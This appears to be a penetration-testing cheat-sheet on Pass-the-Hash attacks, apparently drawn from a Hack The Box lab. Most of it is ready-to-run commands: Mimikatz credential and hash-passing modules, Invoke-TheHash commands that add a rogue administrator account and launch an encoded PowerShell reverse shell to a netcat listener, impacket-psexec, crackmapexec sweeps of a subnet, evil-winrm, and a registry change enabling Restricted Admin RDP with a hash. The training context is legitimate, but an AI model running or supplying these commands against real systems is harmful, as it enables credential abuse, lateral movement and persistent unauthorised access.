
> A [Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.

---

#### Pass the Hash from Windows Using Mimikatz:

```c
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

1. `sekurlsa::logonpasswords`
2. `sekurlsa::ekeys`
3. `sekurlsa::pth`
4. `sekurlsa::msv`
5. `sekurlsa::dpapi`
6. `sekurlsa::credman`
7. `sekurlsa::tspkg`
8. `sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM_HASH`
9. `sekurlsa::minidump`

#mimikatz #pth 

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

```
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

#invoke-thehash #windows

#### Netcat Listener

```
PS C:\tools> .\nc.exe -lvnp 8001
listening on [any] 8001 ...
```

#netcat #nc

To create a simple reverse shell using PowerShell, we can visit [https://www.revshells.com/](https://www.revshells.com/), set our IP `172.16.1.5` and port `8001`, and select the option `PowerShell #3 (Base64)`, as shown in the following image.

```powershell-session
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e jherkjhekj"
```

#invoke-thehash 

## Pass the Hash with (Linux)

```
$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

```
$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```
$ crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

```
$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

#impacket #impacket_psexec #crackmapexec #smb #evil-winrm #linux  
#### Enable Restricted Admin Mode to Allow PtH

```c
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```
$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

#xfreerdp 

